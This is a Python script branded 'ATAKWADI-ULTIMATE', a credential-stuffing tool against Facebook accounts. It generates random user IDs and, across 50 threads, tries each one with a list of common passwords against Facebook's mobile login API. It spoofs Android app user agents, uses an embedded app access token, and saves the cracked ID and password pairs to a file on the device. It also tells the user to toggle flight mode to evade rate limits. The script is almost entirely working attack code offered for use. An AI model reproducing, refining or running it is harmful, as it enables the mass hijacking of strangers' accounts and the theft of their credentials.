import os, sys, time, random, string, requests, re
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime

# Modules auto-installer
try:
    import requests
except ImportError:
    os.system('pip install requests')

# Colors
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
W = '\033[1;37m' # White
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue

loop = 0
oks = []

# Modern User Agents 2025
def get_ua():
    model = random.choice(['SM-S928B', 'SM-G998B', 'Pixel 9 Pro', 'V2303', 'Infinix X6833B'])
    android = random.choice(['13', '14', '15'])
    fbv = f"{random.randint(400, 550)}.0.0.{random.randint(10, 99)}.{random.randint(100, 200)}"
    return f"Dalvik/2.1.0 (Linux; U; Android {android}; {model} Build/UP1A.231005.007) [FBAN/FB4A;FBAV/{fbv};FBBV/{random.randint(500000000, 999999999)};FBDM/{{density=3.0,width=1080,height=2280}};FBLC/en_US;FBRV/0;FBCR/Jazz;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/{android};FBOP/1;FBCA/arm64-v8a:;]"

# UID Age Checker (Calculates year from UID)
def get_age(uid):
    try:
        uid_int = int(uid)
        if uid_int < 100000000: return "2004-2005"
        elif 100000000 <= uid_int <= 1000000000: return "2006"
        elif 1000000000 <= uid_int <= 10000000000: return "2007-2008"
        elif uid.startswith('100000'): return "2009"
        elif uid.startswith('100001'): return "2010"
        elif uid.startswith('100002'): return "2011"
        elif uid.startswith('100003'): return "2012"
        elif uid.startswith('100004'): return "2013"
        elif uid.startswith('100005'): return "2014"
        elif uid.startswith('100006'): return "2015"
        elif uid.startswith('6155'): return "2023-2025 (New)"
        else: return "Unknown"
    except: return "N/A"

def logo():
    os.system('clear')
    now = datetime.now().strftime("%H:%M:%S")
    print(f"""
{R}   ▄▀▄▀▀▀▀▄▀▄  {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}  █          █ {G}  █████  ██████  █████  ██  ██
{R}  █          █ {G}  ██  ██   ██    ██  ██ ██ ██ 
{R}  ▀▄        ▄▀ {G}  ██████   ██    ██████ ████  
{R}    █      █   {G}  ██  ██   ██    ██  ██ ██ ██ 
{R}    █      █   {G}  ██  ██   ██    ██  ██ ██  ██
{W}    ▀▀▀▀▀▀▀▀   {R}       [ ATAKWADI-ULTIMATE ]
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G} [+] TIME NOW : {Y}{now}
{G} [+] STATUS   : FULLY UNLOCKED
{G} [+] SAVE     : /sdcard/atakwadi_full.txt
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def main():
    logo()
    print(f" {G}[1] Start Multi-Country Cloning")
    print(f" {G}[2] Old ID Special (2009-2012)")
    print(f" {R}[0] Exit")
    print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    opt = input(f' {G}[?] Choice: {W}')
    if opt == '1' or opt == '2':
        start_crack()
    else: exit()

def start_crack():
    logo()
    limit = int(input(f" {G}[?] Enter ID Limit: {W}"))
    ids = []
    for _ in range(limit):
        # Hybrid UID generation
        prefix = random.choice(['100000', '100001', '100002', '100003', '6155'])
        ids.append(prefix + "".join(random.choices(string.digits, k=9 if '6155' not in prefix else 11)))

    with tred(max_workers=50) as engine:
        logo()
        print(f" {G}[+] Total Task : {W}{len(ids)}")
        print(f" {G}[+] Methods    : {W}Multi-API + Graph")
        print(f" {R}[!] Speed Is High - Use Flight Mode")
        print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for uid in ids:
            engine.submit(crack_ultimate, uid)

def crack_ultimate(uid):
    global loop, oks
    age = get_age(uid)
    dt = datetime.now().strftime("%Y-%m-%d %H:%M")
    sys.stdout.write(f'\r {W}[ATAKWADI] {loop} | {G}OK:{len(oks)}{W} '); sys.stdout.flush()
    
    try:
        # Best High-Success Password List
        fname = ["ali", "khan", "ahmad", "malik", "hamza", "hassan", "kumar", "singh"]
        pws = [uid, uid[6:], '572732', '575757', '786786', '000786', 'pakistan', '123456', '12345678', '987654321']
        
        for p in fname:
            pws.append(p + "123")
            pws.append(p + "12345")
            pws.append(p + "786")

        for pw in pws:
            if len(pw) < 6: continue
            ua = get_ua()
            session = requests.Session()
            url = "https://b-graph.facebook.com/auth/login"
            data = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "sdk_style": "android",
                "email": uid,
                "password": pw,
                "generate_session_cookies": "1"
            }
            res = session.post(url, data=data, headers={'User-Agent': ua}).json()
            
            if "session_key" in res:
                print(f'\r\n{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f'{G} [OK] {uid} | {pw}')
                print(f'{G} [AGE] Created in: {W}{age}')
                print(f'{G} [TIME] Cracked at: {W}{dt}')
                print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                oks.append(uid)
                open('/sdcard/atakwadi_ok.txt', 'a').write(f"{uid}|{pw}|{age}|{dt}\n")
                break
        loop += 1
    except:
        pass

if __name__ == "__main__":
    main()
